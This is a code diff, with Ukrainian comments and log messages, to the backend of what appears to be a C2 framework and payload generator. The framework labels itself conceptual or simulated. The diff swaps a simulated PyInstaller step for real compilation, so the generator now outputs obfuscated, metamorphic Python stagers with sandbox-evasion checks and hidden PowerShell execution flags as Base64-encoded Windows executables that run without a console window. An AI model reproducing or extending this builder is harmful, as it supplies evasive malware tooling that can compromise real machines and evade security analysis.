@@ -25,12 +25,12 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.1"
+VERSION_BACKEND = "1.8.1" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.0)
+CONCEPTUAL_CVE_DATABASE_BE = {
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -39,7 +39,7 @@ CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.0)
     "nginx 1.18.0": [{"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "A security issue in nginx resolver was identified, which might allow an attacker..."}]
 }
 
-def initialize_simulated_implants_be(): # Логіка (без змін)
+def initialize_simulated_implants_be():
     global simulated_implants_be, pending_tasks_for_implants
     simulated_implants_be = []
     pending_tasks_for_implants = {} 
@@ -63,7 +63,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.0)
+CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -118,20 +118,20 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.0)
         "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass" 
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
-    "output_format": {
+    "output_format": { 
         "type": str, "required": False,
         "allowed_values": ["raw_python_stager", "base64_encoded_stager", "pyinstaller_exe_windows"],
         "default": "raw_python_stager"
     },
-    "pyinstaller_options": {
+    "pyinstaller_options": { 
         "type": str,
         "required": False,
-        "default": "--onefile --noconsole"
+        "default": "--onefile --noconsole" 
     },
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.8.0)
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
     "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST з виконанням завдань)", "template_type": "python_stager_http_c2_beacon"},
@@ -728,7 +728,7 @@ def handle_generate_payload():
             "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
             "    return \"\".join(o_chars)",
             "",
-            f"def {evasion_func_name_runtime}():", # Логіка (без змін від v1.7.7)
+            f"def {evasion_func_name_runtime}():", # Логіка (без змін від v1.8.0)
             "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
             "    indicators = []",
             "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
@@ -983,7 +983,7 @@ def handle_generate_payload():
         ])
         stager_code_raw = "\n".join(stager_code_lines)
 
-        if validated_params.get('enable_stager_metamorphism', False): # Логіка метаморфізму (без змін)
+        if validated_params.get('enable_stager_metamorphism', False): 
             log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
             stager_code_raw_for_metamorph = stager_code_raw
             stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code(stager_code_raw_for_metamorph, key, log_messages)
@@ -1000,21 +1000,74 @@ def handle_generate_payload():
 
         output_format = validated_params.get("output_format")
         final_stager_output = ""
-        if output_format == "pyinstaller_exe_windows": # Логіка PyInstaller (без змін)
-            log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE (концептуально).")
-            pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
-            pyinstaller_options = shlex.split(pyinstaller_options_str)
-            temp_py_filename = "temp_stager_for_pyinstaller.py"
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 1. Збереження Python-стейджера (можливо, метаморфізованого) у тимчасовий файл: {temp_py_filename}")
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM]    Вміст (перші 100 символів): {stager_code_raw[:100]}...")
-            pyinstaller_cmd_sim = ["pyinstaller"] + pyinstaller_options + [temp_py_filename]
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 2. Симуляція виклику PyInstaller: {' '.join(pyinstaller_cmd_sim)}")
-            time.sleep(0.5) 
-            compiled_exe_name_sim = temp_py_filename.replace(".py", ".exe")
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM] 3. PyInstaller (симуляція) завершено. Очікуваний файл: dist/{compiled_exe_name_sim}")
-            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
-            log_messages.append(f"[BACKEND_PYINSTALLER_SIM_OUTPUT] Повернення Base64 Python-стейджера як представлення EXE (довжина: {len(final_stager_output)}).")
-            log_messages.append("\n[ПРИМІТКА] Повернений Base64 представляє Python-код стейджера, а не скомпільований .EXE. Це концептуальна реалізація PyInstaller.")
+        
+        if output_format == "pyinstaller_exe_windows":
+            log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE.")
+            pyinstaller_path = shutil.which("pyinstaller")
+            if not pyinstaller_path:
+                log_messages.append("[BACKEND_PYINSTALLER_ERROR] PyInstaller не знайдено в системному PATH. Повернення Base64 Python-коду.")
+                final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+                log_messages.append("\n[ПРИМІТКА] PyInstaller не знайдено. Повернений Base64 представляє Python-код стейджера.")
+            else:
+                log_messages.append(f"[BACKEND_PYINSTALLER_INFO] PyInstaller знайдено: {pyinstaller_path}")
+                pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
+                pyinstaller_options = shlex.split(pyinstaller_options_str)
+                
+                with tempfile.TemporaryDirectory() as tmpdir:
+                    log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Створено тимчасову директорію: {tmpdir}")
+                    temp_py_filename = os.path.join(tmpdir, "stager_to_compile.py")
+                    
+                    with open(temp_py_filename, "w", encoding="utf-8") as f:
+                        f.write(stager_code_raw)
+                    log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Python-стейджер збережено у: {temp_py_filename}")
+
+                    # Визначаємо ім'я вихідного файлу на основі імені вхідного файлу
+                    base_script_name = os.path.splitext(os.path.basename(temp_py_filename))[0]
+
+                    # Шляхи для PyInstaller всередині тимчасової директорії
+                    dist_path = os.path.join(tmpdir, "dist")
+                    work_path = os.path.join(tmpdir, "build")
+                    
+                    pyinstaller_cmd = [
+                        pyinstaller_path,
+                        *pyinstaller_options,
+                        "--distpath", dist_path,
+                        "--workpath", work_path,
+                        "--specpath", tmpdir, # Зберігаємо .spec файл також у тимчасовій директорії
+                        temp_py_filename
+                    ]
+                    log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Запуск PyInstaller: {' '.join(pyinstaller_cmd)}")
+                    
+                    try:
+                        compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300) # 5 хвилин на компіляцію
+                        log_messages.append(f"[BACKEND_PYINSTALLER_STDOUT] {compile_process.stdout}")
+                        if compile_process.returncode != 0:
+                            log_messages.append(f"[BACKEND_PYINSTALLER_ERROR] Помилка PyInstaller (код: {compile_process.returncode}): {compile_process.stderr}")
+                            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+                            log_messages.append("\n[ПРИМІТКА] Помилка компіляції PyInstaller. Повернений Base64 представляє Python-код стейджера.")
+                        else:
+                            compiled_exe_path = os.path.join(dist_path, base_script_name + ".exe")
+                            if os.path.exists(compiled_exe_path):
+                                log_messages.append(f"[BACKEND_PYINSTALLER_SUCCESS] .EXE файл успішно створено: {compiled_exe_path}")
+                                with open(compiled_exe_path, "rb") as f_exe:
+                                    exe_bytes = f_exe.read()
+                                final_stager_output = base64.b64encode(exe_bytes).decode('utf-8')
+                                log_messages.append(f"[BACKEND_PYINSTALLER_INFO] .EXE файл закодовано в Base64 (довжина: {len(final_stager_output)}).")
+                            else:
+                                log_messages.append(f"[BACKEND_PYINSTALLER_ERROR] .EXE файл не знайдено у {dist_path} після компіляції.")
+                                final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+                                log_messages.append("\n[ПРИМІТКА] .EXE файл не знайдено. Повернений Base64 представляє Python-код стейджера.")
+                    except subprocess.TimeoutExpired:
+                        log_messages.append("[BACKEND_PYINSTALLER_ERROR] Час очікування PyInstaller вичерпано.")
+                        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+                        log_messages.append("\n[ПРИМІТКА] Таймаут PyInstaller. Повернений Base64 представляє Python-код стейджера.")
+                    except Exception as e_pyinst:
+                        log_messages.append(f"[BACKEND_PYINSTALLER_FATAL] Непередбачена помилка під час компіляції PyInstaller: {str(e_pyinst)}")
+                        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
+                        log_messages.append("\n[ПРИМІТКА] Непередбачена помилка PyInstaller. Повернений Base64 представляє Python-код стейджера.")
+                log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Тимчасову директорію {tmpdir} видалено.")
+
+
         elif output_format == "base64_encoded_stager":
             final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
             log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
@@ -1320,6 +1373,7 @@ if __name__ == '__main__':
     print("  GET  /api/operational_data")
     print("  POST /api/framework_rules")
     print("Переконайтеся, що 'nmap' встановлено та доступно в PATH для використання 'port_scan_nmap_standard' та 'port_scan_nmap_cve_basic'.")
+    print("Для генерації .EXE пейлоадів, PyInstaller має бути встановлений та доступний в PATH.")
     print("Натисніть Ctrl+C для зупинки.")
     print("="*60)
     app.run(host='localhost', port=5000, debug=False)
